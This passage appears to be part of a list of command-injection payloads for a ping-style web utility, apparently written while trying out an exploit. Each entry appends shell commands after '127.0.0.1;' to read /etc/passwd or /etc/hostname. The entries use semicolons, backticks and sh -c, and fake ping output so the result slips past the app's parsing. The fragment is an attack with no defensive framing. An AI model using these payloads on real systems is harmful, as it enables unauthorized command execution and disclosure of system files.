    "127.0.0.1;wc -l /etc/passwd | awk '{print $1}';echo 'packets transmitted, 2 received, 0% packet loss'",
    
    # Backticks for command substitution
    "127.0.0.1;echo \`/bin/cat /etc/hostname\` packets transmitted, 2 received, 0% packet loss",
    
    # Try more specific - output the full ping format line
    "127.0.0.1;sh -c 'echo \"`cat /etc/hostname` packets transmitted, 2 received, 0% packet loss\"'",
    
